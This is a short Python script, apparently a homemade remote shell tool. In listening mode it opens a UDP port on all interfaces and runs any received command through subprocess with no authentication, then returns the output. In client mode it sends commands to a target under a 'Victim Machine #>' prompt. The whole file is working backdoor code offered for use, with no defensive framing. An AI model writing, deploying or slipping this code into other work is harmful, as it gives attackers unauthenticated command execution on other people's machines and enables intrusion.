#!/usr/bin/python3

from socket import *
from sys import * # built-in library
from argparse import *
from subprocess import *

def help():
    print("Usage ./remote.py -t <target_host> -p <port>\n")
    print("Examples:\n")
    print("User mode: ./remote.py -t 192.168.8.108 -p 9999\n")
    print("Listening mode: ./remote.py -l -p 9999\n")

def main():
    if(len(argv[1:]) < 2): # CLI arguments evaluation
        help() # showing instructions

    # adding CLI arguments
    parser = ArgumentParser(add_help=False) # argparse library
    parser.add_argument('-t', '--target') # used as a variable
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-l', '--listen', action='store_true')
    args = parser.parse_args()

    # generating socket
    s = socket(AF_INET, SOCK_DGRAM, 0) # UDP socket generation

    # listening mode
    if(args.listen == True): # evaluating -l flag
        if(args.target): # evaluating -t flag
            print("Listening mode, don't use -t flag")
            exit()

        # binding the connection provided to the string
        s.bind(("0.0.0.0", args.port))

        while(True):
            msg,addr = s.recvfrom(65000) # receiving message
            com = msg.decode('ascii') # receiving the client command

            data = com[0:].split(' ') # splitting elements
            if(len(data[0:]) > 1):
                # run function - subprocess library
                res = run([data[0], data[1]], stdout=PIPE)
            else:
                # run function - subprocess library
                res = run([com], stdout=PIPE)

            # decoding the stdout
            here = res.stdout.decode('utf-8')
            # sending the response to the server
            s.sendto(here.encode('utf-8'), addr)

    # user mode
    else:
        while(True):
            c = input("Victim Machine #>")
            s.sendto(c.encode('ascii'),(args.target, args.port))
            rmsg, addr = s.recvfrom(65000) # addresing the victim
            print(rmsg.decode('utf-8')) # printing the results

if __name__ == "__main__":
    main()
